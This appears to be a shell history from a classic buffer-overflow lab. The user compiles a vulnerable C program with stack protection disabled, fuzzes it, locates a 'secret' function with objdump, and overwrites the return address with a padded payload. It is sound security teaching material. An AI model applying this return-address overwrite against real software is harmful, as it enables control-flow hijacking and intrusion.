vi vuln.c
gcc vuln.c -o vuln -fno-stack-protector -m32
./vuln
vi fuzz.py
python fuzz.py
objdump -d vuln
objdump -d vuln | grep secret
python -c 'print "a"*32 + "\x9d\x84\x04\x08"' | ./vuln
